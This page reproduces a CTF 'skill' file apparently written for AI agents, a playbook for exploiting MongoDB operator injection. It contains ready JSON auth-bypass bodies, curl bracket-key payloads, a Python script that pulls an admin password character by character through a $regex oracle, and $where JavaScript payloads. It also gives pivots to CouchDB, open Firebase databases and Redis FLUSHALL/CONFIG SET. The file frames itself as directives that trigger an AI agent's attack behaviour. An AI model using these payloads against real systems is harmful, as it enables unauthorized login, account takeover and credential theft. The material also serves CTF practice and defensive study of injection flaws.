# NoSQL Injection (MongoDB Operator Injection)

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/nosql-injection.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/nosql-injection.md)

---

---
name: nosql-injection
category: web
triggers: [mongodb, mongoose, nosql, "$ne", "$gt", "$regex", "$where", "$in", json-login, "username[$ne]", couchdb, firebase, bson]
tools: [curl, burpsuite, nosqlmap, ffuf, python-requests, jq]
priority: high
description: Exploit NoSQL (MongoDB) operator injection for authentication bypass, boolean/blind data extraction, and server-side JS execution.
---
# NoSQL Injection (MongoDB Operator Injection)

## Trigger context
Fire when the backend is MongoDB/Mongoose/CouchDB/Firebase, when login or search takes JSON bodies, when parameters are reflected into queries, or when you can inject `[$ne]`-style keys via form/query params. Classic tell: a JSON login `{"username":"x","password":"y"}` or a `Content-Type: application/json` API.

## Objective
Manipulate the query object with MongoDB operators so a comparison the app intends as equality becomes "match anything" (auth bypass) or a boolean oracle (blind extraction). Deliverable = logged-in session as a victim, or exfiltrated credentials/secrets.

## Methodology (decision tree)
1. Identify input format. JSON body -> inject nested operator objects. URL/form -> inject bracket keys (`param[$ne]=x`).
2. Auth bypass first: replace values with `{"$ne":null}` / `{"$gt":""}` on username+password. Logged in -> done.
3. Target a known user: `username="admin"`, `password={"$ne":"x"}` -> logs in as admin without the password.
4. No known user? `username={"$regex":"^a"}` to enumerate valid usernames char-by-char.
5. Blind extraction: use `$regex` on the password/secret field, observe response differences (status/length/text) to leak it character by character.
6. Error-based: malformed operators may throw MongoError leaking structure. Time-based: `$where` with a sleep confirms JS eval.
7. Legacy `$where`/`mapReduce` -> attempt server-side JavaScript execution.

## Commands & payloads
```http
### JSON auth bypass (any account)
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}

### JSON auth bypass (target admin, skip its password)
{"username":"admin","password":{"$ne":"wrong"}}
{"username":{"$in":["admin","root","administrator"]},"password":{"$ne":null}}

### Operator via $regex to confirm and pin a user
{"username":{"$regex":"^adm"},"password":{"$ne":null}}
```
```bash
# URL / form-encoded operator injection (Express/qs parses brackets into objects)
curl "https://target/login" --data 'username[$ne]=x&password[$ne]=x'
curl "https://target/login" --data 'username=admin&password[$ne]=x'
curl "https://target/search" --data 'user[$regex]=.*&pass[$ne]=1'
curl "https://target/x" --data 'login[$gt]=admin&login[$lt]=test&pass[$ne]=1'   # range
curl "https://target/x" --data 'login[$nin][]=admin&login[$nin][]=test&pass[$ne]=1'
```
```python
# Blind boolean extraction of admin's password via $regex oracle
import requests, string
url = "https://target/api/login"
charset = string.ascii_letters + string.digits + "_@!.-"
known = ""
while True:
    for c in charset:
        payload = {"username": "admin",
                   "password": {"$regex": f"^{known+c}"}}
        r = requests.post(url, json=payload, allow_redirects=False)
        if r.status_code == 302 or "Welcome" in r.text:   # success oracle
            known += c
            print("[+]", known); break
    else:
        break   # no char matched -> full value recovered
print("password =", known)
```
```http
### Legacy server-side JS execution / time-based confirmation
{"username":"admin","password":{"$where":"sleep(5000)||'a'=='a'"}}
{"$where":"this.password.match(/^a/)"}
```

## Detection probes (send these first)
```bash
# String-context break + always-true / always-false to spot injection
curl "https://target/search?q=admin'"              # error / different response
curl "https://target/search?q[$ne]=zzzz"           # returns more rows => operator parsed
curl -g "https://target/x?age[$gt]=0"              # -g stops curl globbing []{}
# JS-context (legacy) true vs false oracle:
#   payload'||'1'=='1     (true, more results)   vs   payload'&&'1'=='2   (false, none)
```

## Branching logic
- JSON endpoint -> nested operator objects; form/query endpoint -> bracket-key injection (works when server uses `qs`/`body-parser` extended parsing).
- Bypass succeeds with `$ne` but you need a specific account -> switch to `$regex`/`$in` targeting.
- Response identical for true/false -> use $regex to build a boolean oracle (length/redirect/text diff); if still blind, try `$where` time-based.
- Structured escaping blocks operators in JSON -> try the URL-encoded bracket form (often not sanitized).
- Escalate with NoSQLMap for automation once the injection point and oracle are proven.

## Common pitfalls
- Modern MongoDB disables `$where`/JS by default; don't assume RCE — lead with operator injection.
- Strict schemas (Mongoose with typed String fields) cast objects to strings, killing operator injection — confirm the field accepts objects.
- Auth bypass may log you in as the FIRST matching document (often not admin); use `$in`/`$regex` to steer to the target.
- `$regex` special chars (`.`, `^`, `$`, `*`) need escaping when the leaked value contains them.
- Rate limiting slows blind extraction; batch via the oracle and back off on 429.
- JSON `Content-Type` is often required; the server may ignore bracket params if it only reads JSON.

## Other NoSQL engines (quick pivots)
- CouchDB: `_all_docs`, `_users` endpoints; Mango selectors accept `{"$gt":null}`; try `/_utils` (Fauxton) and `/_config` for admin/RCE on old versions.
- Firebase/Firestore: test open `*.firebaseio.com/.json` (unauthenticated read), and insecure rules (`".read": true`).
- Redis (via injected commands): CRLF into commands, `FLUSHALL`/`CONFIG SET` if exposed.
- Automation: `nosqlmap` for MongoDB/CouchDB, or a custom `$regex` oracle script (above) — usually faster and more reliable than the tool for one-off CTF extraction.

## Proof / verification
Show a login returning a valid session/redirect using an operator payload instead of real credentials, or a reconstructed secret (password/token/flag) extracted character-by-character with the blind script and then used to authenticate normally. Capture request+response demonstrating the bypass.

## Cross-references
- [sa--instructions--web--auth-jwt-session.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--auth-jwt-session.md) — after bypassing login, inspect/forge the issued token.
- [sa--instructions--web--idor-access-control.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--idor-access-control.md) — the bypassed session then enables object enumeration.
- [sa--instructions--web--api-graphql-rest.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--api-graphql-rest.md) — API params frequently reach the Mongo query unsanitized.

## Credible sources
- https://portswigger.net/web-security/nosql-injection
- https://book.hacktricks.xyz/pentesting-web/nosql-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md
- https://owasp.org/www-community/Injection_Flaws
- https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- https://nullsweep.com/nosql-injection-cheatsheet/
